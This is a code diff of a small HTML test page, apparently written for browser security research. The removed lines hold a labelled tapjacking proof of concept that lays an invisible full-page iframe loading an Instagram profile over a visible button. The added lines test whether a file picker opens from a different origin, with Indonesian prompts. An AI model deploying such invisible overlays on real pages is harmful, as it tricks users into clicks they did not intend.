@@ -1,33 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Tapjacking PoC Example</title>
-  <style>
-    /* Making the iframe invisible */
-    iframe {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      opacity: 0;  /* Making the iframe invisible */
-      pointer-events: none;  /* Preventing interactions with the iframe itself */
-    }
-    button {
-      position: relative;
-      z-index: 1;  /* Ensure button is on top */
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Picker on Different Origin</title>
 </head>
 <body>
-  <h2>Tapjacking Example</h2>
-  
-  <!-- Real visible button -->
-  <button onclick="alert('Button clicked!')">Click Me!</button>
-  
-  <!-- Invisible iframe (mimicking a hidden "Follow" button or other element) -->
-  <iframe src="https://www.instagram.com/unthrz" ></iframe>
+
+<button id="fileButton">Pilih File</button>
+
+<script>
+    document.getElementById('fileButton').addEventListener('click', () => {
+        alert("Jika file picker muncul, maka masalah ini ada.");
+        
+        // Coba buka file picker
+        showOpenFilePicker({
+            types: [{
+                description: 'Image files',
+                accept: {'image/*': ['.png', '.jpg', '.jpeg']}
+            }]
+        })
+        .then(fileHandles => {
+            alert("File dipilih: " + fileHandles[0].name);
+        })
+        .catch(err => {
+            alert("Terjadi error: " + err);
+        });
+    });
+</script>
+
 </body>
 </html>
